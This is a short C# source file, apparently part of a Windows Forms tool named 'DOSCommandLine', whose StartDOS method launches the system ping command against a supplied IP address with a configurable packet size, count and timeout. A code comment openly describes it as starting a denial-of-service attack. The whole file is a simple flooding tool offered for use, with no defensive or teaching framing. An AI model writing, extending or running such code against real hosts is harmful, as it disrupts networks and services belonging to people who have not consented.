using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Threading;

namespace DOSCommandLine
{
    public abstract class IFunctions
    {

        public static void StartDOS(string ip, int time = 2000, int packages = 2000, int packagesLength = 1000)
        {
            //Calls the commands to start the DOS attack, within the ip, the time that ths will execute, the number of packages and their length.
            try
            {
                Process.Start("ping", String.Format("-l {0} -n {1} -w {2} {3}", packagesLength, packages, time, ip));
            }
            catch
            {
                MessageBox.Show("Something goes wrong....");
                Application.Restart();
            }
        }
    }
}
